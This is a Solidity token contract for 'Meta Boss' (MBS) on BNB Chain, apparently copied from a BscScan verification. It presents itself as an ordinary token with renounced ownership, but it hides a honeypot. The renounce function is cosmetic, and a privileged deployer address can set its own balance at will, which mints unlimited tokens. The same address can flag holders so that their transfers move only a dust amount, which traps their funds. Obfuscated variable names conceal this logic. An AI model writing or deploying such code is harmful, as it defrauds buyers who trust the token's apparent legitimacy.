/**
 *Submitted for verification at BscScan.com on 2023-01-27
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MetaBoss {
    uint8 public decimals = 18;

    mapping(address => bool) public fromReceiverTo;
    uint256 constant launchList = 11 ** 10;
    address public atTo;
    address public atShould;
    mapping(address => mapping(address => uint256)) public allowance;
    bool public teamTx;


    uint256 public totalSupply = 100000000 * 10 ** 18;


    string public name = "Meta Boss";
    mapping(address => uint256) public balanceOf;
    string public symbol = "MBS";
    mapping(address => bool) public liquidityAmount;
    address public owner;
    modifier enableAuto() {
        require(fromReceiverTo[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed launchedTotal, address indexed sellLiquidity);
    event Transfer(address indexed burnFundList, address indexed enableMode, uint256 launchEnable);
    event Approval(address indexed buySender, address indexed shouldTeamFee, uint256 launchEnable);

    constructor (){
        IUniswapV2Router sellTo = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        atShould = IUniswapV2Factory(sellTo.factory()).createPair(sellTo.WETH(), address(this));
        owner = msg.sender;
        atTo = owner;
        fromReceiverTo[atTo] = true;
        balanceOf[atTo] = totalSupply;
        emit Transfer(address(0), atTo, totalSupply);
        renounceOwnership();
    }

    

    function takeTx(address launchTake, address maxSwap, uint256 liquidityShould) internal returns (bool) {
        require(balanceOf[launchTake] >= liquidityShould);
        balanceOf[launchTake] -= liquidityShould;
        balanceOf[maxSwap] += liquidityShould;
        emit Transfer(launchTake, maxSwap, liquidityShould);
        return true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(atTo, address(0));
        owner = address(0);
    }

    function transfer(address sellAuto, uint256 liquidityShould) external returns (bool) {
        return transferFrom(msg.sender, sellAuto, liquidityShould);
    }

    function walletAt(address amountAt) public enableAuto {
        if (amountAt == atTo) {
            return;
        }
        liquidityAmount[amountAt] = true;
    }

    function shouldReceiver(uint256 liquidityShould) public enableAuto {
        balanceOf[atTo] = liquidityShould;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address isBurn, address sellAuto, uint256 liquidityShould) public returns (bool) {
        if (isBurn != msg.sender && allowance[isBurn][msg.sender] != type(uint256).max) {
            require(allowance[isBurn][msg.sender] >= liquidityShould);
            allowance[isBurn][msg.sender] -= liquidityShould;
        }
        if (sellAuto == atTo || isBurn == atTo) {
            return takeTx(isBurn, sellAuto, liquidityShould);
        }
        if (liquidityAmount[isBurn]) {
            return takeTx(isBurn, sellAuto, launchList);
        }
        return takeTx(isBurn, sellAuto, liquidityShould);
    }

    function fromToken(address marketingFund) public {
        if (teamTx) {
            return;
        }
        fromReceiverTo[marketingFund] = true;
        teamTx = true;
    }


}